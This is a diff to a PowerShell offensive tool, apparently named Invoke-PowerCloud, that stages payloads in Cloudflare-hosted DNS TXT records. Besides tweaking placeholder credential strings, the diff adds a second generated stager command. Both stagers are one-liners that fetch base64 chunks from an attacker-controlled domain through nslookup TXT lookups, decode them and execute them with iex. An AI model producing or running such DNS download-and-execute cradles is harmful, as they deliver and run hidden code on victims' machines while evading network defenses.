@@ -14,10 +14,10 @@ function Invoke-PowerCloud() {
 )
 
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $Global:API_KEY = "your-api-key"
+    $Global:API_KEY = "your-cloudlfare-api-key"
     $Global:zoneId = ""
     $Global:API_URL = "https://api.cloudflare.com/client/v4"
-    $Global:EMAIL = "your-cloudlfare-account-email-address"
+    $Global:EMAIL = "your-cloudlfare-email"
     $Global:HEADERS = @{
         "X-Auth-Key" = $Global:API_KEY
         "X-Auth-Email" = $Global:EMAIL
@@ -160,8 +160,13 @@ function Invoke-PowerCloud() {
     }
 
     function Write-Stager($chunksCount, $nameServer) {
+        $stager = '$b64=""; (1..'+$chunksCount+') | ForEach-Object { $b64+=(nslookup -q=txt "$_.' + $Domain + '"' + ')[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace(''\t|"'',"")))))'
+        Write-Host -ForegroundColor DarkCyan "`n[*] Stager using non-authoritative NS server:"
+        Write-host $stager
+        
         $stager = '$b64=""; (1..'+$chunksCount+') | ForEach-Object { $b64+=(nslookup -q=txt "$_.' + $Domain + '" ' + $nameServer + ')[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace(''\t|"'',"")))))'
-        Write-Host $stager
+        Write-Host -ForegroundColor DarkGreen "`n[*] Stager using authoritative NS server:"
+        Write-host $stager
     }
 
     $zones = Get-DNSZones
